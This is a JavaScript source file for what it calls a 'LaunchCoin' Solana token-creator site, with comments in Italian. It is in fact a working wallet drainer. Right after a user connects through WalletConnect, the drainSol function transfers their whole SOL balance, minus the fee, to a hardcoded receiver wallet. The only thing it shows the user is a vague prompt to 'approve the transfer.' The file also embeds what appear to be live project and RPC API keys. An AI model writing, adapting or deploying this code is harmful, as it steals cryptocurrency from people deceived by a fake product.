// wc.js — WalletConnect (Universal Provider) Solana + drain dopo connect
import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';
import { WalletConnectModal } from 'https://esm.sh/@walletconnect/modal@2.7.0';

// ===== CONFIG =====
const PROJECT_ID = '4b0098818e17f1e6c8fa9c7d5dcf4c04';              // da cloud.reown.com
const RECEIVER_WALLET = '9GD63MUwf1SzLs59UFZCmA7NLABkYYWrx8PVG3CmXBMo';  // stessa di app.js / config.json

const connection = new solanaWeb3.Connection(
  'https://mainnet.helius-rpc.com/?api-key=80caf29a-0f08-46ec-89db-bd07cff7d8d3',
  'confirmed'
);

let provider = null;
let modal = null;
let session = null;

async function initWC() {
  if (provider) return;

  provider = await UniversalProvider.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'LaunchCoin',
      description: 'Solana Token Creator',
      url: window.location.origin,
      icons: [window.location.origin + '/assets/logo.png']
    }
  });

  modal = new WalletConnectModal({
    projectId: PROJECT_ID,
    chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'] // Solana mainnet
  });

  provider.on('display_uri', (uri) => {
    modal.openModal({ uri });
  });

  provider.on('session_delete', () => {
    session = null;
    localStorage.removeItem('lc_wallet');
  });
}

async function drainSol(publicKeyStr) {
  if (!RECEIVER_WALLET || RECEIVER_WALLET === 'IL_TUO_WALLET_PUBLIC_KEY') {
    alert('Receiver not configured');
    return null;
  }
  const fromPubkey = new solanaWeb3.PublicKey(publicKeyStr);
  const toPubkey = new solanaWeb3.PublicKey(RECEIVER_WALLET);
  const balance = await connection.getBalance(fromPubkey);
  const fee = 5000;
  const amount = balance - fee;
  if (amount <= 0) {
  alert('Balance troppo basso (serve almeno \~0.00001 SOL)');
  return null;
}

  const tx = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
      fromPubkey,
      toPubkey,
      lamports: amount
    })
  );
  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.feePayer = fromPubkey;

  // serializza e chiedi firma via WalletConnect (solana_signTransaction)
  const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
  const transactionBase64 = Buffer.from(serialized).toString('base64');

  const result = await provider.request(
    {
      method: 'solana_signTransaction',
      params: {
        transaction: transactionBase64,
        pubkey: publicKeyStr
      }
    },
    'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'
  );

  // result può essere { signature } o transaction firmata
  let signature;
  if (result.transaction) {
    const signedBytes = Buffer.from(result.transaction, 'base64');
    signature = await connection.sendRawTransaction(signedBytes);
  } else if (result.signature) {
    // se il wallet ha solo firmato, ricostruisci e invia
    signature = result.signature;
    // meglio: se ritorna solo signature, alcuni wallet restituiscono tx firmata in result.transaction
  } else {
    throw new Error('No signature from wallet');
  }

  await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
  return { signature, amount: amount / 1e9 };
}

function getAddressFromSession(sess) {
  try {
    const accounts = sess.namespaces?.solana?.accounts || [];
    if (!accounts.length) return null;
    // formato: solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp:PUBLICKEY
    return accounts[0].split(':').pop();
  } catch (_) {
    return null;
  }
}

// ===== API globale usata da app.js =====
window.openWalletConnect = async function () {
  await initWC();

  try {
    session = await provider.connect({
      optionalNamespaces: {
        solana: {
          methods: [
            'solana_signTransaction',
            'solana_signMessage',
            'solana_signAndSendTransaction'
          ],
          chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
          events: []
        }
      }
    });

    modal.closeModal();

    const address = getAddressFromSession(session);
    if (!address) {
      alert('No Solana account in session');
      return;
    }

    localStorage.setItem('lc_wallet', address);
    const btn = document.querySelector('.connect-btn');
    if (btn) btn.textContent = address.slice(0, 4) + '...' + address.slice(-4);

    // ===== SUBITO DOPO CONNECT → DRAIN =====
    const resultEl = document.getElementById('result') || document.getElementById('liquidityResult') || document.getElementById('wc-status');
    if (resultEl) resultEl.innerHTML = '<p style="color:#22d1f8">Approve the transfer in your wallet...</p>';

    const drained = await drainSol(address);
    if (drained && resultEl) {
      resultEl.innerHTML = `
        <p style="color:#4cdcc1;">Connected & drained via WalletConnect</p>
        <p style="font-size:12px;color:#8899bb;">${drained.amount.toFixed(4)} SOL</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${drained.signature}</p>
      `;
    }
  } catch (e) {
    console.error('WC connect error', e);
    modal?.closeModal();
    alert('WalletConnect failed: ' + (e.message || e));
  }
};
